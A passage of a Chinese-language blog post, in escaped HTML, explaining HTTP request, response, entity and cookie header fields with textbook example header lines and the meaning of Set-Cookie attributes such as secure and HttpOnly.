title=\"Authorization\"></a>Authorization</h4><p><img src=\"https://images.dadream.eu.org/images/2024/07/b03ee40399dfa19fd529932d4b425bf2.png\"></p>\n<p>首部字段 Authorization 是用来告知服务器，用户代理的认证信息（证书值）。通常，想要通过服务器认证的用户代理会在接收到返回的401 状态码响应后，把首部字段 Authorization 加入请求中。共用缓存在接收到含有 Authorization 首部字段的请求时的操作处理会略有差异。</p>\n<h4 id=\"Expect\"><a href=\"#Expect\" class=\"headerlink\" title=\"Expect\"></a>Expect</h4><p><img src=\"https://images.dadream.eu.org/images/2024/07/505b2dc20140f2229009f7b1d50c6003.png\"></p>\n<p>客户端使用首部字段 Expect 来告知服务器，期望出现的某种特定行为。因服务器无法理解客户端的期望作出回应而发生错误时，会返回状态码 417 Expectation Failed。</p>\n<p>客户端可以利用该首部字段，写明所期望的扩展。</p>\n<h4 id=\"From\"><a href=\"#From\" class=\"headerlink\" title=\"From\"></a>From</h4><p><img src=\"https://images.dadream.eu.org/images/2024/07/7eab6c8381ea2f0dfc218ee7b8bd0917.png\"></p>\n<p>首部字段 From 用来告知服务器使用用户代理的用户的电子邮件地址。通常，其使用目的就是为了显示搜索引擎等用户代理的负责人的电子邮件联系方式。使用代理时，应尽可能包含 From 首部字段（但可能会因代理不同，将电子邮件地址记录在 User-Agent 首部字段内）。</p>\n<h4 id=\"Host\"><a href=\"#Host\" class=\"headerlink\" title=\"Host\"></a>Host</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">www.hackr.jp</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 Host 会告知服务器，请求的资源所处的互联网主机名和端口号。Host 首部字段在 HTTP/1.1 规范内是唯一一个必须被包含在请求内的首部字段。</p>\n<p>虚拟主机运行在同一个 <strong>IP</strong> 上，因此使用首部字段 <strong>Host</strong> 加以区分</p>\n<p>若服务器未设定主机名，那直接发送一个空值即可。</p>\n<h4 id=\"If-XXX\"><a href=\"#If-XXX\" class=\"headerlink\" title=\"If-XXX\"></a>If-XXX</h4><p>形如 If-xxx 这种样式的请求首部字段，都可称为条件请求。服务器接收到附带条件的请求后，只有判断指定条件为真时，才会执行请求。</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/882524fadb21c8271d082b988d4bc4fe.png\"></p>\n<h4 id=\"If-Match\"><a href=\"#If-Match\" class=\"headerlink\" title=\"If-Match\"></a>If-Match</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">If-Match</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">\"123456\"</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 If-Match，属附带条件之一，它会告知服务器匹配资源所用的实体标记（ETag）值。</p>\n<p>服务器会比对 If-Match 的字段值和资源的 ETag 值，仅当两者一致时，才会执行请求。反之，则返回状态码 412 Precondition Failed 的响应。</p>\n<p>通配符<code>*</code>跳过匹配</p>\n<h4 id=\"If-Modified-Since\"><a href=\"#If-Modified-Since\" class=\"headerlink\" title=\"If-Modified-Since\"></a>If-Modified-Since</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">If-Modified-Since</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Thu, 15 Apr 2004 00:00:00 GMT</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 If-Modified-Since，属附带条件之一，它会告知服务器若 If- Modified-Since 字段值早于资源的更新时间，则希望能处理该请求。而在指定 If-Modified-Since 字段值的日期时间之后，如果请求的资源都没有过更新，则返回状态码 304 Not Modified 的响应。</p>\n<p>If-Modified-Since 用于确认代理或客户端拥有的本地资源的有效性。获取资源的更新日期时间，可通过确认首部字段 Last-Modified 来确定。</p>\n<h4 id=\"If-None-Match\"><a href=\"#If-None-Match\" class=\"headerlink\" title=\"If-None-Match\"></a>If-None-Match</h4><p><img src=\"https://images.dadream.eu.org/images/2024/07/7443e192d3075d7a42155c0632ce4c06.png\"></p>\n<p>它和首部字段 If-Match 作用相反。</p>\n<p>在 GET 或 HEAD 方法中使用首部字段 If-None-Match 可获取最新的资源。因此，这与使用首部字段 If-Modified-Since 时有些类似。</p>\n<h4 id=\"If-Range\"><a href=\"#If-Range\" class=\"headerlink\" title=\"If-Range\"></a>If-Range</h4><p>首部字段 If-Range 属于附带条件之一。它告知服务器若指定的 If- Range 字段值（ETag 值或者时间）和请求资源的 ETag 值或时间相一致时，则作为范围请求处理。反之，则返回全体资源。</p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/9e0a6505cd35db6f7beb949d933106cc.png\"></p>\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/d82cef8fcce80a19ce1cbcbc522d76b8.png\"></p>\n<h4 id=\"If-Unmodified-Since\"><a href=\"#If-Unmodified-Since\" class=\"headerlink\" title=\"If-Unmodified-Since\"></a>If-Unmodified-Since</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">If-Unmodified-Since</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Thu, 03 Jul 2012 00:00:00 GMT</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 If-Unmodified-Since 和首部字段 If-Modified-Since 的作用相反。它的作用的是告知服务器，指定的请求资源只有在字段值内指定的日期时间之后，未发生更新的情况下，才能处理请求。如果在指定日期时间后发生了更新，则以状态码 412 Precondition Failed 作为响应返回。</p>\n<h4 id=\"Max-Forwards\"><a href=\"#Max-Forwards\" class=\"headerlink\" title=\"Max-Forwards\"></a>Max-Forwards</h4><p><img src=\"https://images.dadream.eu.org/images/2024/07/58c2400eb309d5ef98d5a565925de4b3.png\"></p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Max-Forwards</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">10</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>每次转发数值减 <strong>1</strong>。当数值变 <strong>0</strong> 时返回响应</p>\n<p>通过 TRACE 方法或 OPTIONS 方法，发送包含首部字段 Max- Forwards 的请求时，该字段以十进制整数形式指定可经过的服务器最大数目。</p>\n<h4 id=\"Proxy-Authorization\"><a href=\"#Proxy-Authorization\" class=\"headerlink\" title=\"Proxy-Authorization\"></a>Proxy-Authorization</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Proxy-Authorization</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Basic dGlwOjkpNLAGfFY5</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>接收到从代理服务器发来的认证质询时，客户端会发送包含首部字段Proxy-Authorization 的请求，以告知服务器认证所需要的信息。</p>\n<h4 id=\"Range\"><a href=\"#Range\" class=\"headerlink\" title=\"Range\"></a>Range</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Range</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">bytes=5001-10000</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>对于只需获取部分资源的范围请求，包含首部字段 Range 即可告知服务器资源的指定范围。上面的示例表示请求获取从第 5001 字节至第10000 字节的资源。</p>\n<p>接收到附带 Range 首部字段请求的服务器，会在处理请求之后返回状态码为 206 Partial Content 的响应。无法处理该范围请求时，则会返回状态码 200 OK 的响应及全部资源。</p>\n<h4 id=\"Referer\"><a href=\"#Referer\" class=\"headerlink\" title=\"Referer\"></a>Referer</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Referer</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://www.hackr.jp/index.htm</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 Referer 会告知服务器请求的原始资源的 URI。</p>\n<h4 id=\"TE\"><a href=\"#TE\" class=\"headerlink\" title=\"TE\"></a>TE</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">TE</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate;q=0.5</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 TE 会告知服务器客户端能够处理响应的传输编码方式及相对优先级。它和首部字段 Accept-Encoding 的功能很相像，但是用于传输编码。</p>\n<p>首部字段 TE 除指定传输编码之外，还可以指定伴随 trailer 字段的分块传输编码的方式。应用后者时，只需把 trailers 赋值给该字段值。</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">TE</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">trailers</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"User-Agent\"><a href=\"#User-Agent\" class=\"headerlink\" title=\"User-Agent\"></a>User-Agent</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gec</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 User-Agent 会将创建请求的浏览器和用户代理名称等信息传达给服务器。</p>\n<h3 id=\"响应首部字段-1\"><a href=\"#响应首部字段-1\" class=\"headerlink\" title=\"响应首部字段\"></a>响应首部字段</h3><p>响应首部字段是由服务器端向客户端返回响应报文中所使用的字段， 用于补充响应的附加信息、服务器信息，以及对客户端的附加要求等信息。</p>\n<h4 id=\"Accept-Ranges\"><a href=\"#Accept-Ranges\" class=\"headerlink\" title=\"Accept-Ranges\"></a>Accept-Ranges</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Ranges</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">bytes</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 Accept-Ranges 是用来告知客户端服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。</p>\n<p>可指定的字段值有两种，可处理范围请求时指定其为 bytes，反之则指定其为 none。</p>\n<h4 id=\"Age\"><a href=\"#Age\" class=\"headerlink\" title=\"Age\"></a>Age</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Age</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">600</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 Age 能告知客户端，源服务器在多久前创建了响应。字段值的单位为秒。</p>\n<p>若创建该响应的服务器是缓存服务器，Age 值是指缓存后的响应再次发起认证到认证完成的时间值。代理创建响应时必须加上首部字段Age。</p>\n<h4 id=\"ETag\"><a href=\"#ETag\" class=\"headerlink\" title=\"ETag\"></a>ETag</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">ETag</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">\"82e22293907ce725faf67773957acd12\"</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/0e9a820ce5a8a8b4b440975ba2efbed4.png\"></p>\n<p>仅仅是由服务器来分配。</p>\n<h5 id=\"强-ETag-值\"><a href=\"#强-ETag-值\" class=\"headerlink\" title=\"强 ETag 值\"></a>强 <strong>ETag</strong> 值</h5><p>强 ETag 值，不论实体发生多么细微的变化都会改变其值。</p>\n<p><code>ETag: \"usagi-1234\"</code></p>\n<h5 id=\"弱-ETag-值\"><a href=\"#弱-ETag-值\" class=\"headerlink\" title=\"弱 ETag 值\"></a>弱 <strong>ETag</strong> 值</h5><p>弱 ETag 值只用于提示资源是否相同。只有资源发生了根本改变，产生差异时才会改变 ETag 值。这时，会在字段值最开始处附加 W/。</p>\n<p><code>ETag: W/\"usagi-1234\"</code></p>\n<h4 id=\"Location\"><a href=\"#Location\" class=\"headerlink\" title=\"Location\"></a>Location</h4><p><img src=\"https://images.dadream.eu.org/images/2024/07/d427319a2e408e1a28ec464f7a19eb32.png\"></p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Location</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://www.usagidesign.jp/sample.html</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>使用首部字段 Location 可以将响应接收方引导至某个与请求 URI 位置不同的资源。</p>\n<p>基本上，该字段会配合 3xx ：Redirection 的响应，提供重定向的URI。</p>\n<h4 id=\"Proxy-Authenticate\"><a href=\"#Proxy-Authenticate\" class=\"headerlink\" title=\"Proxy-Authenticate\"></a>Proxy-Authenticate</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Proxy-Authenticate</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Basic realm=\"Usagidesign Auth\"</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 Proxy-Authenticate 会把由代理服务器所要求的认证信息发送给客户端。</p>\n<h4 id=\"Retry-After\"><a href=\"#Retry-After\" class=\"headerlink\" title=\"Retry-After\"></a>Retry-After</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Retry-After</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">120</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 Retry-After 告知客户端应该在多久之后再次发送请求。主要配合状态码 503 Service Unavailable 响应，或 3xx Redirect 响应一起使用。</p>\n<p>字段值可以指定为具体的日期时间（Wed, 04 Jul 2012 06：34：24 GMT 等格式），也可以是创建响应后的秒数。</p>\n<h4 id=\"Server\"><a href=\"#Server\" class=\"headerlink\" title=\"Server\"></a>Server</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Server</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Apache/2.2.6 (Unix) PHP/5.2.5</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 Server 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。不单单会标出服务器上的软件应用名称，还有可能包括版本号和安装时启用的可选项。</p>\n<h4 id=\"Vary\"><a href=\"#Vary\" class=\"headerlink\" title=\"Vary\"></a>Vary</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Vary</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Accept-Language</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>从代理服务器接收到源服务器返回包含 Vary 指定项的响应之后，若再要进行缓存，仅对请求中含有相同 Vary 指定首部字段的请求返回缓存。即使对相同资源发起请求，但由于 Vary 指定的首部字段不相同，因此必须要从源服务器重新获取资源。</p>\n<h4 id=\"WWW-Authenticate\"><a href=\"#WWW-Authenticate\" class=\"headerlink\" title=\"WWW-Authenticate\"></a>WWW-Authenticate</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">WWW-Authenticate</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Basic realm=\"Usagidesign Auth\"</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 WWW-Authenticate 用于 HTTP 访问认证。它会告知客户端适用于访问请求 URI 所指定资源的认证方案（Basic 或是 Digest）和带参数提示的质询（challenge）。状态码 401 Unauthorized 响应中， 肯定带有首部字段 WWW-Authenticate。</p>\n<h3 id=\"实体首部字段-1\"><a href=\"#实体首部字段-1\" class=\"headerlink\" title=\"实体首部字段\"></a>实体首部字段</h3><p>实体首部字段是包含在请求报文和响应报文中的实体部分所使用的首部，用于补充内容的更新时间等与实体相关的信息。</p>\n<h4 id=\"Alow\"><a href=\"#Alow\" class=\"headerlink\" title=\"Alow\"></a>Alow</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Allow</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">GET, HEAD</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 Allow 用于通知客户端能够支持 Request-URI 指定资源的所有 HTTP 方法。当服务器接收到不支持的 HTTP 方法时，会以状态码405 Method Not Allowed 作为响应返回。与此同时，还会把所有能支持的 HTTP 方法写入首部字段 Allow 后返回。</p>\n<h4 id=\"Content-Encoding\"><a href=\"#Content-Encoding\" class=\"headerlink\" title=\"Content-Encoding\"></a>Content-Encoding</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Content-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 Content-Encoding 会告知客户端服务器对实体的主体部分选用的内容编码方式。内容编码是指在不丢失实体信息的前提下所进行的压缩。</p>\n<ul>\n<li>gzip</li>\n<li>compress</li>\n<li>deflate</li>\n<li>identity</li>\n</ul>\n<h4 id=\"Content-Languag\"><a href=\"#Content-Languag\" class=\"headerlink\" title=\"Content-Languag\"></a>Content-Languag</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Content-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 Content-Language 会告知客户端，实体主体使用的自然语言（指中文或英文等语言）。</p>\n<h4 id=\"Content-Length\"><a href=\"#Content-Length\" class=\"headerlink\" title=\"Content-Length\"></a>Content-Length</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">15000</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 Content-Length 表明了实体主体的大小（单位是字节）。对实体主体进行内容编码传输时，不能再使用 Content-Length 首部字段。</p>\n<h4 id=\"Content-Location\"><a href=\"#Content-Location\" class=\"headerlink\" title=\"Content-Location\"></a>Content-Location</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Content-Location</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://www.hackr.jp/index-ja.html</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 Content-Location 给出与报文主体部分相对应的 URI。和首部字段Location 不同，Content-Location 表示的是报文主体返回资源对应的 URI。</p>\n<p>比如，对于使用首部字段 Accept-Language 的服务器驱动型请求，当返回的页面内容与实际请求的对象不同时，首部字段 Content-Location 内会写明 URI。</p>\n<h4 id=\"Content-MD5\"><a href=\"#Content-MD5\" class=\"headerlink\" title=\"Content-MD5\"></a>Content-MD5</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Content-MD5</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">OGFkZDUwNGVhNGY3N2MxMDIwZmQ4NTBmY2IyTY==</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://images.dadream.eu.org/images/2024/07/cae670c7d7ca3bf6ff620ed7cf4fafe2.png\"></p>\n<p>首部字段 Content-MD5 是一串由 MD5 算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达。</p>\n<p>对报文主体执行 MD5 算法获得的 128 位二进制数，再通过 Base64 编码后将结果写入 Content-MD5 字段值。由于 HTTP 首部无法记录二进制值，所以要通过 Base64 编码处理。为确保报文的有效性，作为接收方的客户端会对报文主体再执行一次相同的 MD5 算法。计算出的值与字段值作比较后，即可判断出报文主体的准确性。</p>\n<h4 id=\"Content-Range\"><a href=\"#Content-Range\" class=\"headerlink\" title=\"Content-Range\"></a>Content-Range</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Content-Range</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">bytes 5001-10000/10000</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>针对范围请求，返回响应时使用的首部字段 Content-Range，能告知客户端作为响应返回的实体的哪个部分符合范围请求。字段值以字节为单位，表示当前发送部分及整个实体大小。</p>\n<h4 id=\"Content-Type\"><a href=\"#Content-Type\" class=\"headerlink\" title=\"Content-Type\"></a>Content-Type</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html; charset=UTF-8</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 Content-Type 说明了实体主体内对象的媒体类型。和首部字段 Accept 一样，字段值用 type/subtype 形式赋值。</p>\n<h4 id=\"Expires\"><a href=\"#Expires\" class=\"headerlink\" title=\"Expires\"></a>Expires</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Expires</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Wed, 04 Jul 2012 08:26:05 GMT</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 Expires 会将资源失效的日期告知客户端。缓存服务器在接收到含有首部字段 Expires 的响应后，会以缓存来应答请求，在Expires 字段值指定的时间之前，响应的副本会一直被保存。当超过指定的时间后，缓存服务器在请求发送过来时，会转向源服务器请求资源。</p>\n<p>当首部字段 Cache-Control 有指定 max-age 指令时，比起首部字段 Expires，会优先处理 max-age 指令。</p>\n<h4 id=\"Last-Modified\"><a href=\"#Last-Modified\" class=\"headerlink\" title=\"Last-Modified\"></a>Last-Modified</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Last-Modified</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Wed, 23 May 2012 09:59:55 GMT</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>首部字段 Last-Modified 指明资源最终修改的时间。一般来说，这个值就是 Request-URI 指定资源被修改的时间。但类似使用 CGI 脚本进行动态数据处理时，该值有可能会变成数据最终修改时的时间。</p>\n<h3 id=\"为-Cookie-服务的首部字段\"><a href=\"#为-Cookie-服务的首部字段\" class=\"headerlink\" title=\"为 Cookie 服务的首部字段\"></a>为 <strong>Cookie</strong> 服务的首部字段</h3><p>Cookie 的工作机制是用户识别及状态管理。Web 网站为了管理用户的状态会通过 Web 浏览器，把一些数据临时写入用户的计算机内。接着当用户访问该Web网站时，可通过通信方式取回之前发放的Cookie。</p>\n<p>调用 Cookie 时，由于可校验 Cookie 的有效期，以及发送方的域、路径、协议等信息，所以正规发布的 Cookie 内的数据不会因来自其他Web 站点和攻击者的攻击而泄露。</p>\n<h4 id=\"Cookie-的规格标准文档\"><a href=\"#Cookie-的规格标准文档\" class=\"headerlink\" title=\"Cookie 的规格标准文档\"></a>Cookie 的规格标准文档</h4><ul>\n<li><h6 id=\"RFC2109\"><a href=\"#RFC2109\" class=\"headerlink\" title=\"RFC2109\"></a>RFC2109</h6></li>\n<li><h6 id=\"RFC2965\"><a href=\"#RFC2965\" class=\"headerlink\" title=\"RFC2965\"></a>RFC2965</h6></li>\n<li><h6 id=\"RFC6265\"><a href=\"#RFC6265\" class=\"headerlink\" title=\"RFC6265\"></a>RFC6265</h6></li>\n<li><p>由网景公司颁布的规格标准</p>\n</li>\n</ul>\n<h4 id=\"Cookie-服务的首部字段\"><a href=\"#Cookie-服务的首部字段\" class=\"headerlink\" title=\"Cookie 服务的首部字段\"></a><strong>Cookie</strong> 服务的首部字段</h4><table>\n<thead>\n<tr>\n<th>首部字段名</th>\n<th>说明</th>\n<th>首部类型</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Set-Cookie</td>\n<td>开始状态管理所使用的Cookie信息</td>\n<td>响应首部字段</td>\n</tr>\n<tr>\n<td>Cookie</td>\n<td>服务器接收到的Cookie信息</td>\n<td>请求首部字段</td>\n</tr>\n</tbody></table>\n<h4 id=\"Set-Cookie\"><a href=\"#Set-Cookie\" class=\"headerlink\" title=\"Set-Cookie\"></a>Set-Cookie</h4><pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Set-Cookie</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">status=enable; expires=Tue, 05 Jul 2011 07:26:31</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>Set-Cookie</strong> 字段的属性</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>NAME=VALUE</td>\n<td>赋予 Cookie 的名称和其值（必需项）</td>\n</tr>\n<tr>\n<td>expires=DATE</td>\n<td>Cookie 的有效期（若不明确指定则默认为浏览器关闭前为止）</td>\n</tr>\n<tr>\n<td>path=PATH</td>\n<td>将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档所在的文件目录）</td>\n</tr>\n<tr>\n<td>domain=域名</td>\n<td>作为 Cookie 适用对象的域名  （若不指定则默认为创建 Cookie  的服务器的域名）</td>\n</tr>\n<tr>\n<td>Secure</td>\n<td>仅在 HTTPS 安全通信时才会发送  Cookie</td>\n</tr>\n<tr>\n<td>HttpOnly</td>\n<td>加以限制，使 Cookie 不能被 JavaScript 脚本访问</td>\n</tr>\n</tbody></table>\n<h6 id=\"expires-属性\"><a href=\"#expires-属性\" class=\"headerlink\" title=\"expires 属性\"></a>expires 属性</h6><p>Cookie 的 expires 属性指定浏览器可发送 Cookie 的有效期。</p>\n<p>当省略 expires 属性时，其有效期仅限于维持浏览器会话（Session） 时间段内。这通常限于浏览器应用程序被关闭之前。</p>\n<p>另外，一旦 Cookie 从服务器端发送至客户端，服务器端就不存在可以显式删除 Cookie 的方法。但可通过覆盖已过期的 Cookie，实现对客户端 Cookie 的实质性删除操作。</p>\n<h5 id=\"path-属性\"><a href=\"#path-属性\" class=\"headerlink\" title=\"path 属性\"></a><strong>path</strong> 属性</h5><p>Cookie 的 path 属性可用于限制指定 Cookie 的发送范围的文件目录。不过另有办法可避开这项限制，看来对其作为安全机制的效果不能抱有期待。</p>\n<h5 id=\"domain-属性\"><a href=\"#domain-属性\" class=\"headerlink\" title=\"domain 属性\"></a><strong>domain</strong> 属性</h5><p>通过 Cookie 的 domain 属性指定的域名可做到与结尾匹配一致。比如，当指定 example.com 后，除 example.com 以外，<a href=\"http://www.example.com/\">www.example.com </a>或www2.example.com 等都可以发送 Cookie。</p>\n<p>因此，除了针对具体指定的多个域名发送 Cookie 之 外，不指定domain 属性显得更安全</p>\n<h5 id=\"secure-属性\"><a href=\"#secure-属性\" class=\"headerlink\" title=\"secure 属性\"></a><strong>secure</strong> 属性</h5><p>Cookie 的 secure 属性用于限制 Web 页面仅在 HTTPS 安全连接时，才可以发送 Cookie。</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Set-Cookie</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">name=value; secure</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h6 id=\"HttpOnly-属性\"><a href=\"#HttpOnly-属性\" class=\"headerlink\" title=\"HttpOnly 属性\"></a>HttpOnly 属性</h6><p>Cookie 的 HttpOnly 属性是 Cookie 的扩展功能，它使 JavaScript 脚本无法获得 Cookie。其主要目的为防止跨站脚本攻击（Cross-site scripting，XSS）对 Cookie 的信息窃取。</p>\n<pre class=\"line-numbers language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token header\"><span class=\"token header-name keyword\">Set-Cookie</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">name=value; HttpOnly</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"Cookie\"><a 